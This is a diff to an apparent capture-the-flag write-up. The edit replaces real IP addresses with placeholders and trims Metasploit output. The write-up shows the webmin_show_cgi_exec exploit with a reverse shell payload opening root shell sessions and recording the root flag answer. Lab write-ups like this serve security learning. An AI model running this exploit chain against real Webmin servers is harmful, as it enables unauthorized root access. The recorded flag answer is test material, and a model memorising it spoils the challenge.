@@ -245,18 +245,9 @@ msf exploit(unix/webapp/webmin_show_cgi_exec) > set lhost tun0
 lhost => tun0
 msf exploit(unix/webapp/webmin_show_cgi_exec) > run
 [*] Exploiting target 127.0.0.1
-[*] Started reverse TCP handler on 192.168.159.255:4444 
+[*] Started reverse TCP handler on <attackBoxIP>:4444 
 [*] Attempting to login...
-[+] Authentication successful
-[+] Authentication successful
-[*] Attempting to execute the payload...
-[+] Payload executed successfully
-[*] Exploiting target ::1
-[*] Started reverse TCP handler on 192.168.159.255:4444 
-[*] Attempting to login...
-[+] Authentication successful
-[+] Authentication successful
-[*] Attempting to execute the payload...
+...
 [+] Payload executed successfully
 [*] Exploit completed, but no session was created.
 ```
@@ -266,42 +257,12 @@ msf exploit(unix/webapp/webmin_show_cgi_exec) > set payload 6
 payload => cmd/unix/reverse
 msf exploit(unix/webapp/webmin_show_cgi_exec) > run
 [*] Exploiting target 127.0.0.1
-[*] Started reverse TCP double handler on 192.168.159.255:4444 
-[*] Attempting to login...
-[+] Authentication successful
-[+] Authentication successful
-[*] Attempting to execute the payload...
+[*] Started reverse TCP double handler on <attackBoxIP>:4444 
+...
 [+] Payload executed successfully
 [*] Accepted the first client connection...
-[*] Accepted the second client connection...
-[*] Command: echo Cer0s8sq1flmMyP1;
-[*] Writing to socket A
-[*] Writing to socket B
-[*] Reading from sockets...
-[*] Reading from socket A
-[*] A: "Cer0s8sq1flmMyP1\r\n"
-[*] Matching...
-[*] B is input...
-[*] Command shell session 1 opened (192.168.159.255:4444 -> 10.49.181.12:49764) at 2026-04-29 14:25:21 +1000
-[*] Session 1 created in the background.
-[*] Exploiting target ::1
-[*] Started reverse TCP double handler on 192.168.159.255:4444 
-[*] Attempting to login...
-[+] Authentication successful
-[+] Authentication successful
-[*] Attempting to execute the payload...
-[*] Accepted the first client connection...
-[*] Accepted the second client connection...
-[+] Payload executed successfully
-[*] Command: echo kIzoCXjnV7tiqvh0;
-[*] Writing to socket A
-[*] Writing to socket B
-[*] Reading from sockets...
-[*] Reading from socket A
-[*] A: "kIzoCXjnV7tiqvh0\r\n"
-[*] Matching...
-[*] B is input...
-[*] Command shell session 2 opened (192.168.159.255:4444 -> 10.49.181.12:49772) at 2026-04-29 14:25:31 +1000
+...
+[*] Command shell session 2 opened (<attackBoxIP>:4444 -> <TargetIP>:49772) at 2026-04-29 14:25:31 +1000
 [*] Session 2 created in the background.
 ```
 Success! And here is where I found two sessions were successful. But start by looking at the last one created. I cirle back to first one after that and discover it actually worked as well.
@@ -313,9 +274,9 @@ Active sessions
 
   Id  Name  Type            Information  Connection
   --  ----  ----            -----------  ----------
-  1         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49764 (127.
+  1         shell cmd/unix               <attackBoxIP>:4444 -> <TargetIP>:49764 (127.
                                          0.0.1)
-  2         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49772 (::1)
+  2         shell cmd/unix               <attackBoxIP>:4444 -> <TargetIP>:49772 (::1)
 
 msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 2
 [*] Starting interaction with 2...
@@ -334,6 +295,7 @@ a4b945830144bdd71908d12d902adeee
 ```
 ## Q1 What is the root flag?
 Answer: a4b945830144bdd71908d12d902adeee
+
 Double check session I assumed failed and it actually worked.
 ```
 Background session 2? [y/N]  y
@@ -344,9 +306,9 @@ Active sessions
 
   Id  Name  Type            Information  Connection
   --  ----  ----            -----------  ----------
-  1         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49764 (127.
+  1         shell cmd/unix               <attackBoxIP>:4444 -> <TargetIP>:49764 (127.
                                          0.0.1)
-  2         shell cmd/unix               192.168.159.255:4444 -> 10.49.181.12:49772 (::1)
+  2         shell cmd/unix               <attackBoxIP>:4444 -> <TargetIP>:49772 (::1)
 
 msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 1
 [*] Starting interaction with 1...
@@ -354,10 +316,8 @@ msf exploit(unix/webapp/webmin_show_cgi_exec) > sessions -i 1
 whoami
 root
 cd /root
-pwd
-/root
 ls
 root.txt
 ```
 
-```
+
